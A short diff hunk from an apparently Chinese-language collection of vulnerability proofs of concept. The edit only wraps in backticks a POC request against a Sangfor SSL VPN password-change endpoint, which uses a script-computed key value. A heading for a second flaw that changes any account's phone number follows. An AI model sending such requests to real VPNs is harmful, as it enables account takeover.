@@ -461,7 +461,7 @@ br
 
 POC:  
 
-https://<PATH>/por/changepwd.csp(post)sessReq=clusterd&sessid=0&str=RC4\_STR&len=RC4\_STR&len=(sangfor\_key.py 脚本计算后结果的值)
+`https://<PATH>/por/changepwd.csp(post)sessReq=clusterd&sessid=0&str=RC4\_STR&len=RC4\_STR&len=(sangfor\_key.py 脚本计算后结果的值)`
 
 #### **21\. 某信服 SSL VPN 修改任意账户手机号**
 
